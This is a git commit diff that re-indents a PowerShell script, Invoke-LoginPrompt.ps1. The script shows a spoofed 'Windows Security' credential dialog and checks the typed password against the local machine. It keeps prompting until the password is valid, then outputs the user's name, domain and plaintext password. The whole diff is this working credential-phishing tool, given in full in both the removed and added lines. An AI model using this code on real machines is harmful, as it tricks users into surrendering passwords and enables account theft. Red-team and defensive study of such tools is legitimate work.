a36f3ffc111bf6d4121336bb4448ff356b2fd3f4
Matt Nelson <enigma0x3@users.noreply.github.com>
2016-03-14 19:41:16 -0400

    Update Invoke-LoginPrompt.ps1

--- Invoke-LoginPrompt.ps1
+++ Invoke-LoginPrompt.ps1
@@ -1,22 +1,22 @@
 function Invoke-LoginPrompt{
-$cred = $Host.ui.PromptForCredential("Windows Security", "Please enter user credentials", "$env:userdomain\$env:username","")
-$username = "$env:username"
-$domain = "$env:userdomain"
-$full = "$domain" + "\" + "$username"
-$password = $cred.GetNetworkCredential().password
-Add-Type -assemblyname System.DirectoryServices.AccountManagement
-$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
-while($DS.ValidateCredentials("$full", "$password") -ne $True){
-    $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
+    $cred = $Host.ui.PromptForCredential("Windows Security", "Please enter user credentials", "$env:userdomain\$env:username","")
     $username = "$env:username"
     $domain = "$env:userdomain"
     $full = "$domain" + "\" + "$username"
     $password = $cred.GetNetworkCredential().password
     Add-Type -assemblyname System.DirectoryServices.AccountManagement
     $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
-    $DS.ValidateCredentials("$full", "$password") | out-null
-    }
- 
- $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
- $output
+    while($DS.ValidateCredentials("$full", "$password") -ne $True){
+        $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
+        $username = "$env:username"
+        $domain = "$env:userdomain"
+        $full = "$domain" + "\" + "$username"
+        $password = $cred.GetNetworkCredential().password
+        Add-Type -assemblyname System.DirectoryServices.AccountManagement
+        $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
+        $DS.ValidateCredentials("$full", "$password") | out-null
+        }
+     
+     $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
+     $output
 }
